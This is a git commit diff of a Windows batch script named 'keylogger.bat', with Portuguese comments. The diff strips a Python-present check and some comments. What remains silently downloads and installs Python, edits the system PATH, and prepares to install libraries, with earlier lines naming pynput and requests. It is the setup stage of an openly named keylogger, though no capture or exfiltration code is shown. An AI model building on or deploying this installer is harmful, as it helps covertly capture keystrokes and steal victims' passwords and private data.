b185c74e5ef5ae46b1c4fbf6779fcb984bc8ae8e
Marcelo Assis <>
2023-10-26 02:13:47 -0300

    Update keylogger.bat

--- keylogger.bat
+++ keylogger.bat
@@ -1,24 +1,8 @@
 @echo off
-
-rem Verifique se o Python já está instalado
-python --version
-if %errorlevel% == 0 (
-  rem Python já está instalado
-  rem Instale as bibliotecas necessárias
-  python -m pip install requests pynput
-  rem Rode o script em um novo processo em segundo plano
-  exit /b
-)
-
-rem Python não está instalado
-rem Baixe o instalador do Python
-rem https://www.python.org/downloads/
 curl -LO https://www.python.org/ftp/python/3.10.5/python-3.10.5-amd64.exe
 
-rem Execute o instalador do Python
 python-3.10.5-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_msvs2015_runtime=1
 
-rem Adicione o Python ao PATH do sistema
 setx PATH "%PATH%;%ProgramFiles%\Python310\Scripts"
 
 rem Instale as bibliotecas necessárias
